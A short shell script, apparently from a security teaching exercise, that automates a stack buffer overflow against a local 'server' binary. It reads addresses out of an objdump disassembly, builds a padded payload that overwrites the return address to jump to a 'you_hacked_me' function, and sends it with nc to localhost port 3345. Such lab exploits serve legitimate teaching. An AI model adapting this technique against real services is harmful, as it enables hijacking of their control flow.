#!/bin/sh -x

serverpath=server
if test -f kpmake/server; then
	serverpath=kpmake/server
fi
objdump -d $serverpath > server.disas

LC_ALL=C	\
awk '
function reverse(a) {
	s = "";
	for (i = 0; i < 8; i++) {
		s = s "" sprintf("%c", and(a, 0xFF));
		a = rshift(a, 8);
	}

	return s;
}

/you_hacked_me/ {
	hack_addr = reverse(strtonum("0x"$1));
}

/callq.*handle_connection/ {
	getline
	ret_addr = reverse(strtonum("0x"$1));
}

END {
	printf "0123456789ABCDEF01234567" hack_addr "" ret_addr
}
' server.disas |			\
nc localhost 3345

rm -f server.disas
